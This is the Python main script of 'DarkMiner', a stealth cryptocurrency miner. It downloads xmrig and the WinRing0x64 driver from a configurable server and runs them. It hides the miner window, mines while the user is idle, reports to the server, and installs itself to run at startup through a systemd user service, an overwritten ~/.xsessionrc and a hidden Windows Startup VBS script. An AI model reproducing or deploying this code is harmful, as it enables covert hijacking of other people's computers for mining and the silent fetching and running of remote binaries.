# Version 1
#TODO clean up these imports now that we are doing more modular processing
import sys, signal,platform,os,time,subprocess,configparser,multiprocessing,easygui,requests
from Communicate import *
from functions import LinuxIdleTime,WindowsIdleTime

#Script Version
ScriptVersion = '1'
#SHA256 of your downtime programs
SHA256ProgramMiner = '7db002483369077051d179a80105a816c45951c24fe65023d58bc05609c49f65'
SHA256ProgramSheepit = 'e4674e9e1be5bfd843c10dd9e4c42767608e3777760c83f9ccdfad5d9cffe59c'
#Github Repo link
GithubLink = 'https://api.github.com/repos/Luke-Larsen/DarkMiner'
#Development Mode ( Stops it from hiding in the background)
DevMode = 0 #0 off. Anything else means on


#functions
def errorOccurred(errorCode):
    easygui.msgbox(errorCode,"ERROR OCCURRED")
    sys.exit("ERROR")

def UpdateTotalMiningTime(value):
    config.read('config.ini')
    TotalTimeMining = config['value']['TotalTimeMining']
    NewTotalTimeMining = int(TotalTimeMining) + int(value)
    config['value'] = {
        'TotalTimeMining' : NewTotalTimeMining
    }
    with open(os.path.expanduser('~') +'/.darkminer/config.ini', 'w+') as configfile:
        config.write(configfile)

def UpdateScript():
    print("Ran Update")

def Is64Windows():
    return 'PROGRAMFILES(X86)' in os.environ

def GetProgramFiles32():
    if Is64Windows():
        return False
    else:
        return True

from functions import DownloadData

def Miner():
    #TODO: Check if the last idle time is less then 1 minute and if it is increase the idle time required in the config.
    #TODO: Start logging away time so that we can build a simple computer model of downtime to prevent false positives

    if Communication == 2:
        downTimeSignal(BaseSite,1)
    if osSystem == 'win32':
        if not os32Bit:
            if os.path.exists(WinPathDownloads + 'xmrig.exe'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'xmrig.exe', WinPathDownloads + 'xmrig.exe')
            if os.path.exists(WinPathDownloads + 'WinRing0x64.sys'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'WinRing64.sys', WinPathDownloads + 'WinRing0x64.sys')
            if os.path.exists(WinPathDownloads + 'config.json'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'config.json', WinPathDownloads + 'config.json')

            import win32gui
            import win32api
            proc = subprocess.Popen([WinPathDownloads + "xmrig.exe"])
            time.sleep(3)

            def enumWindowFunc(hwnd, windowList):
                """ win32gui.EnumWindows() callback """
                text = win32gui.GetWindowText(hwnd)
                className = win32gui.GetClassName(hwnd)
                if text.find("xmrig") >= 0:
                    windowList.append((hwnd, text, className))

            myWindows = []
            win32gui.EnumWindows(enumWindowFunc, myWindows)
            for hwnd, text, className in myWindows:
                win32gui.ShowWindow(hwnd, False)
            print('Running Miner waiting for action from user')
            TotalSleepTime = 0
            LastActivity = win32api.GetLastInputInfo()
            while True:
                if LastActivity != win32api.GetLastInputInfo():
                    proc.terminate()  # Terminates Child Process
                    UpdateTotalMiningTime(TotalSleepTime)
                    if Communication == 2:
                        downTimeSignal(BaseSite,0)
                    break
                elif LastActivity == win32api.GetLastInputInfo():
                    time.sleep(3)
                    TotalSleepTime += 3
            main()
    elif osSystem == 'Linux':
        if is_64bits:
            if(DownTimeActivity == "Miner"):
                from Miner import LinuxMine64
                LinuxMine64(LinuxPathDownloads,SHA256ProgramMiner,SHA256Program,waitTime,Communication,BaseSite)
            elif(DownTimeActivity == "Sheepit"):
                from sheepit import LinuxRender64
                LinuxRender64(LinuxPathDownloads,waitTime,Communication,BaseSite)
            main()

def Install():
    if easygui.ynbox('Proceed with the install of DarkMiner. If you do not know what this is press NO', 'Title', ('Yes', 'No')):
        if easygui.ynbox('Would you like this to reboot on each startup of the computer', 'Title', ('Yes', 'No')):
            rebootStart = 1
        else:
            rebootStart = 0
        #Grab data for config
        msg = "Enter your configuration values"
        title = "Enter Config data"
        #0 least communication. 2 is the most communication
        fieldNames = ["Webdomain", "Communication mode(0-2)"]
        fieldValues = easygui.multenterbox(msg, title, fieldNames)
        if fieldValues is None:
            sys.exit(0)
        # make sure that none of the fields were left blank
        while 1:
            errmsg = ""
            for i, name in enumerate(fieldNames):
                if fieldValues[i].strip() == "":
                    errmsg += "{} is a required field.\n\n".format(name)
            if errmsg == "":
                break # no problems found
            fieldValues = easygui.multenterbox(errmsg, title, fieldNames, fieldValues)
            if fieldValues is None:
                break

        #writting to config
        config['settings'] = {
            "Agree" : 1,
            "Communication" : fieldValues[1], #0 no communication; 1 basic comunication; 2 verbose communication
            "DownTimeActivity" : "Miner",
            "rebootStart" : rebootStart,
            "waitTime" : '120',
            "WinPathDownloads" : 'C:/Users/' + os.getlogin() + '/Downloads/',
            "LinuxPathDownloads" : os.path.expanduser('~') +'/.darkminer/',
            "UpdateFrom": 0 #0 github, 1 CNC
        }
        config['server'] = {
            "Version" : ScriptVersion,
            'BaseSite' : fieldValues[0]
        }
        config['value'] = {
            'TotalTimeMining' : 0,
            'SHA256Program': SHA256ProgramMiner #Checking the sha256 of the downloaded program to make sure that its good for now you will need to change it manually
        }
        with open('config.ini', 'w') as configfile:
            config.write(configfile)
        TotalTimeMining = 0
        
    
    if(rebootStart):
        #Set path to bin and create a folder in it
        UserPath = os.path.expanduser('~') +'/.darkminer/'
        FileName = sys.argv[0]
        if not os.path.isdir(UserPath):
            if osSystem == 'win32':
               os.makedirs(UserPath)
            elif osSystem == 'Linux':
                os.mkdir(UserPath,0o755)

        #code for setting up the boot     
        if osSystem == 'Linux':
            #switching to using systemd
            #check if systemd user path is set up
            if not os.path.isdir(os.path.expanduser('~')+'/.config/systemd/user'):
                os.mkdir(os.path.expanduser('~')+'/.config/systemd',0o755)
                os.mkdir(os.path.expanduser('~')+'/.config/systemd/user',0o755)

            #Add our service
            filehandle = open(os.path.expanduser('~')+'/.config/systemd/user/darkminer.service', 'w')
            if DevMode == 0:
                filehandle.write('[Unit]\
                                \nDescription=Dark Miner Service\
                                \nPartOf=graphical-session.target\
                                \n[Service]\
                                \nExecStart=/usr/bin/python3.8 '+os.path.expanduser('~')+'/.darkminer/main.py --display=:0.0\
                                \nRestart=always\
                                \n[Install]\
                                \nWantedBy=xsession.target\
                                ')
            else:
                filehandle.write('[Unit]\
                    \nDescription=Dark Miner Service\
                    \nPartOf=graphical-session.target\
                    \n[Service]\
                    \nExecStart=/usr/bin/python3.8 '+os.path.expanduser('~')+'/.darkminer/main.py\
                    \nRestart=always\
                    \n[Install]\
                    \nWantedBy=xsession.target\
                    ')
            filehandle.close()
            #Setting up startup on user login; check graphical environment is ready
            filehandle = open(os.path.expanduser('~')+'/.config/systemd/user/xsession.target', 'w')
            filehandle.write('[Unit]\
                            \nDescription=Users Xsession running\
                            \nBindsTo=graphical-session.target\
                            ')
            filehandle.close()
            #Start xsession.service on user login
            filehandle = open(os.path.expanduser('~')+'/.xsessionrc', 'w')
            filehandle.write('systemctl --user import-environment PATH DBUS_SESSION_BUS_ADDRESS\
                            \nsystemctl --no-block --user start xsession.target\
                            ')
            filehandle.close()
            result = subprocess.run(['systemctl', '--user', 'enable','darkminer'], stdout=subprocess.PIPE)
            print(result)

        elif osSystem == 'win32':
            #I may come back to this later so that I can use the task schedular for updating and running some on crash. Also might make it 
            #easier to install because windows probably picks up this method as a virus.
            #Keep everything clean and in folders
            os.makedirs(os.path.expanduser('~')+"/AppData/Roaming/DarkMiner/")
            bat = open(os.path.expanduser('~')+"/AppData/Roaming/DarkMiner/"+"DarkMiner.bat", "a")
            bat.write("py "+UserPath+"main.py")
            bat.close()
            #now create a vbs script so you don't have to see the damn terminal all the time
            vbs = open(os.path.expanduser('~')+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"+"DarkMiner.vbs", "a")
            vbs.write('Set WinScriptHost = CreateObject("WScript.Shell") \n WinScriptHost.Run Chr(34) & "'+os.path.expanduser('~')+"/AppData/Roaming/DarkMiner/DarkMiner.bat"+'" & Chr(34), 0 \n Set WinScriptHost = Nothing')
            vbs.close()

    #Copy files to working directory
    from shutil import copyfile
    copyfile("main.py", UserPath+"main.py")
    copyfile("functions.py", UserPath+"functions.py")
    copyfile("Communicate.py", UserPath+"Communicate.py")
    copyfile("Miner.py", UserPath+"Miner.py")
    copyfile("sheepit.py", UserPath+"sheepit.py")
    copyfile("config.ini", UserPath+"config.ini")
    #os.remove("config.ini")
    #Start file from working directory
    easygui.msgbox('Installed DarkMiner in '+UserPath+ " starting program", 'All done')
    if osSystem == 'Linux':
        if DevMode == 0:
            os.system("nohup python3 "+UserPath+"main.py"+" &")
        else:
            os.system("python3 "+UserPath+"main.py")
        
    elif osSystem == 'win32':
        os.system("py "+UserPath+"main.py")


def main():
    if osSystem == 'win32':
        WindowsIdleTime()
    elif osSystem == 'Linux':
        LinuxIdleTime(waitTime)
    Miner()

#Handle a program shutdown
def handler(signum = None, frame = None):
    print('\n')
    if DownTimeActivity == "Miner":
        from Miner import Kill
    elif DownTimeActivity == "Sheepit":
        from sheepit import Kill
    Kill()
    print('Program Closed')
    sys.exit(0)

for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP, signal.SIGQUIT]:
    signal.signal(sig, handler)

#Dependency check
try:
    result = subprocess.run(['xprintidle'], stdout=subprocess.PIPE)
except:
    print("xprintidle is not installed")

#Read from Config file if exists
config = configparser.ConfigParser()
if os.path.isfile(os.path.expanduser('~') +'/.darkminer/'+"config.ini"):
    config.read(os.path.expanduser('~') +'/.darkminer/'+"config.ini")
    #Settings
    Agree = int(config['settings']['Agree'])
    Communication = int(config['settings']['communication'])
    DownTimeActivity = config['settings']['DownTimeActivity'] #What you want to run on downtime
    rebootStart = int(config['settings']['rebootStart'])
    waitTime = int(config['settings']['waitTime'])
    WinPathDownloads = config['settings']['WinPathDownloads']
    LinuxPathDownloads = config['settings']['LinuxPathDownloads']
    try:
        UpdateFrom = config['settings']['UpdateFrom']
    except KeyError as e:
        #No value set because this could be an update to a running system
        UpdateFrom = 0

    #Server
    BaseSite = config['server']['BaseSite']
    Version = config['server']['Version']

    #Values
    TotalTimeMining = config['value']['totaltimemining']
    try:
        SHA256Program = config['value']['SHA256Program']
    except KeyError as e:
        SHA256Program = SHA256ProgramMiner
else:
    Agree = 0

#Start of program determines what operating system to go with
if sys.platform.startswith('win32'):
    osSystem = 'win32'
    os32Bit = GetProgramFiles32()
    #Check if User has agreed to mine
    if(Agree):
        #Check version of the program to make sure we are running the latest and greatest
        if Communication >= 1:
            checkVersion(BaseSite,Version,UpdateFrom,GithubLink)
        main()
    else:
        Install()
elif sys.platform.startswith('linux'):
    osSystem = 'Linux'
    is_64bits = sys.maxsize > 2 ** 32
    if(Agree):
        if Communication >= 1:
            checkVersion(BaseSite,Version,UpdateFrom,GithubLink)
        main()
    else:
        Install()